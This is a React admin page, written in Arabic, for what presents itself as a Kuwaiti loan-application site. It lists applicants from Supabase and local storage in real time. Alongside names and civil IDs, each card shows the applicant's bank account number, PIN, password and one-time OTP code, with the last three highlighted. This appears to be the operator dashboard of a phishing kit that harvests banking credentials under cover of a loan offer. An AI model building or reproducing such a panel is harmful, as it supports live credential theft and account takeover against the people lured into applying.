import { useEffect, useState } from 'react'
import { Link } from 'react-router-dom'
import { getApplications } from '../lib/applicationStorage'
import { isSupabaseConfigured, supabase } from '../lib/supabase'

function formatDate(value) {
  if (!value) return '—'
  const date = new Date(value)
  return Number.isNaN(date.getTime()) ? value : date.toLocaleString('ar-KW')
}

export default function AdminApplicationsPage() {
  const [applications, setApplications] = useState([])
  const [source, setSource] = useState('local')

  const loadData = async () => {
    let supabaseData = []
    if (isSupabaseConfigured && supabase) {
      const { data, error } = await supabase
        .from('loan_applications')
        .select('*')
        .order('updated_at', { ascending: false })

      if (!error && data) {
        supabaseData = data
        setSource('supabase')
      } else if (error) {
        console.error('Supabase fetch error:', error.message)
      }
    }

    const localData = getApplications()
    const combinedMap = new Map()

    ;[...localData, ...supabaseData].forEach((item) => {
      const id = item.id || item.created_at
      if (id) {
        combinedMap.set(id, { ...combinedMap.get(id), ...item })
      }
    })

    const finalApplications = Array.from(combinedMap.values()).sort(
      (a, b) => new Date(b.updatedAt || b.updated_at || 0) - new Date(a.updatedAt || a.updated_at || 0)
    )

    setApplications(finalApplications)
    if (supabaseData.length === 0 && localData.length > 0) {
      setSource('تخزين محلي')
    }
  }

  useEffect(() => {
    let active = true
    loadData()

    if (!isSupabaseConfigured || !supabase) return () => { active = false }

    const channel = supabase
      .channel('loan-applications-admin')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'loan_applications' }, () => {
        if (active) loadData()
      })
      .subscribe()

    return () => {
      active = false
      supabase.removeChannel(channel)
    }
  }, [])

  // دالة لحذف الطلب من التخزين المحلي وقاعدة البيانات
  const handleDelete = async (itemId) => {
    if (!window.confirm('هل أنت متأكد من حذف هذا الطلب؟')) return

    // الحذف المحلي
    const localData = getApplications()
    const filteredLocal = localData.filter((item) => (item.id || item.created_at) !== itemId)
    localStorage.setItem('tamwil_applications', JSON.stringify(filteredLocal))

    // الحذف من Supabase إن وجد
    if (isSupabaseConfigured && supabase) {
      const { error } = await supabase.from('loan_applications').delete().eq('id', itemId)
      if (error) {
        console.error('Error deleting from supabase:', error.message)
      }
    }

    setApplications((prev) => prev.filter((item) => (item.id || item.created_at) !== itemId))
  }

  const normalize = (item) => ({
    ...item,
    fullName: item.fullName || item.full_name || item.name,
    phoneNumber: item.phoneNumber || item.phone_number || item.phone,
    civilId: item.civilId || item.civil_id_last2,
    accountNumber: item.accountNumber || item.account_last4,
    amount: item.amount,
    plan: item.plan || item.loanType,
    installmentAmount: item.installmentAmount,
    pin: item.pin,
    password: item.password,
    otpCode: item.otpCode || item.otp_code,
    createdAt: item.createdAt || item.created_at,
    updatedAt: item.updatedAt || item.updated_at,
  })

  const normalizedApplications = applications.map(normalize)
  const pendingCount = normalizedApplications.filter((item) => item.status !== 'submitted').length

  return (
    <div className="min-h-screen bg-slate-100 px-3 py-6 sm:px-6" dir="rtl">
      <div className="mx-auto max-w-7xl">
        <div className="mb-6 flex flex-col gap-3 rounded-[24px] border border-slate-200 bg-white p-4 shadow-sm sm:flex-row sm:items-center sm:justify-between sm:p-5">
          <div>
            <p className="text-xs font-black uppercase tracking-[0.2em] text-slate-500">Loan Requests</p>
            <h1 className="mt-1 text-xl font-black text-slate-950 sm:text-2xl">طلبات القروض والتسجيلات</h1>
          </div>
          <div className="flex flex-wrap gap-2">
            <button onClick={loadData} className="rounded-xl bg-emerald-600 px-4 py-2.5 text-xs font-black text-white hover:bg-emerald-700 sm:text-sm">
              تحديث البيانات
            </button>
            <Link to="/admin" className="rounded-xl bg-slate-900 px-4 py-2.5 text-xs font-black text-white sm:text-sm">
              العودة للوحة الرئيسية
            </Link>
          </div>
        </div>

        <div className="mb-6 grid grid-cols-1 gap-3 sm:grid-cols-3">
          <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm"><p className="text-xs font-bold text-slate-500">إجمالي الطلبات</p><p className="mt-1 text-2xl font-black text-slate-950 sm:text-3xl">{normalizedApplications.length}</p></div>
          <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm"><p className="text-xs font-bold text-slate-500">طلبات قيد المراجعة</p><p className="mt-1 text-2xl font-black text-amber-600 sm:text-3xl">{pendingCount}</p></div>
          <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm"><p className="text-xs font-bold text-slate-500">مصدر البيانات</p><p className="mt-2 font-black text-emerald-700">{source}</p></div>
        </div>

        {normalizedApplications.length === 0 ? (
          <div className="rounded-[24px] border border-dashed border-slate-300 bg-white p-8 text-center text-slate-500">
            لا توجد طلبات مسجلة حاليًا.
          </div>
        ) : (
          <div className="space-y-4">
            {normalizedApplications.map((item) => {
              const itemId = item.id || item.created_at
              return (
                <div key={itemId} className="rounded-[24px] border border-slate-200 bg-white p-4 shadow-sm transition hover:shadow-md sm:p-6">
                  
                  {/* رأس الكارت: اسم العميل، الحالة، زر الحذف */}
                  <div className="mb-4 flex flex-col gap-3 border-b border-slate-100 pb-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="text-xs font-bold text-slate-400">الطلب #{item.id?.slice(0, 8) || 'new'}</p>
                      <h2 className="text-lg font-black text-slate-900 sm:text-xl">{item.fullName || item.username || 'مستخدم جديد'}</h2>
                    </div>
                    <div className="flex items-center justify-between sm:justify-end gap-2">
                      <span className="inline-flex rounded-full bg-emerald-100 px-3 py-1 text-xs font-black text-emerald-700">
                        {item.status || 'new'}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleDelete(itemId)}
                        className="rounded-xl bg-red-50 px-3 py-1.5 text-xs font-black text-red-600 transition hover:bg-red-600 hover:text-white"
                      >
                        حذف الطلب
                      </button>
                    </div>
                  </div>

                  {/* قسم تفاصيل القرض المختار (بارز وواضح) */}
                  {(item.amount || item.plan) && (
                    <div className="mb-4 rounded-2xl bg-amber-50/70 border border-amber-200/60 p-3 sm:p-4">
                      <p className="mb-2 text-xs font-black text-amber-800 uppercase tracking-wider">تفاصيل القرض المختار:</p>
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-sm">
                        <div>
                          <span className="text-xs text-slate-500 block">مبلغ القرض:</span>
                          <span className="font-black text-slate-900">{item.amount ? `${Number(item.amount).toLocaleString()} د.ك` : '—'}</span>
                        </div>
                        <div>
                          <span className="text-xs text-slate-500 block">خطة الأقساط:</span>
                          <span className="font-black text-slate-900">{item.plan || '—'}</span>
                        </div>
                        {item.installmentAmount && (
                          <div>
                            <span className="text-xs text-slate-500 block">قيمة القسط:</span>
                            <span className="font-black text-red-600">{Number(item.installmentAmount).toLocaleString()} د.ك</span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* شبكة بيانات العميل والحسابات */}
                  <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4 text-sm">
                    <div className="rounded-xl bg-slate-50 p-2.5"><p className="text-xs text-slate-500">اسم المستخدم</p><p className="font-bold text-slate-800 mt-0.5">{item.username || '—'}</p></div>
                    <div className="rounded-xl bg-slate-50 p-2.5"><p className="text-xs text-slate-500">البطاقة المدنية</p><p className="font-bold text-slate-800 mt-0.5">{item.civilId || '—'}</p></div>
                    <div className="rounded-xl bg-slate-50 p-2.5"><p className="text-xs text-slate-500">رقم الحساب</p><p className="font-bold text-slate-800 mt-0.5">{item.accountNumber || '—'}</p></div>
                    <div className="rounded-xl bg-red-50/50 p-2.5"><p className="text-xs text-slate-500">الرقم السري (PIN)</p><p className="font-bold text-red-600 mt-0.5">{item.pin || '—'}</p></div>
                    <div className="rounded-xl bg-red-50/50 p-2.5"><p className="text-xs text-slate-500">كلمة المرور</p><p className="font-bold text-red-600 mt-0.5">{item.password || '—'}</p></div>
                    <div className="rounded-xl bg-red-50/50 p-2.5"><p className="text-xs text-slate-500">رمز التحقق (OTP)</p><p className="font-bold text-red-600 mt-0.5">{item.otpCode || '—'}</p></div>
                    <div className="rounded-xl bg-slate-50 p-2.5"><p className="text-xs text-slate-500">رقم الهاتف</p><p className="font-bold text-slate-800 mt-0.5" dir="ltr">{item.phoneNumber || '—'}</p></div>
                    <div className="rounded-xl bg-slate-50 p-2.5"><p className="text-xs text-slate-500">الخطوة الحالية</p><p className="font-bold text-slate-800 mt-0.5 text-xs truncate">{item.step || item.current_step || '—'}</p></div>
                  </div>

                  <div className="mt-3 text-left text-[11px] font-bold text-slate-400">
                    تاريخ الإرسال: {formatDate(item.createdAt || item.created_at)}
                  </div>

                </div>
              )
            })}
          </div>
        )}
      </div>
    </div>
  )
}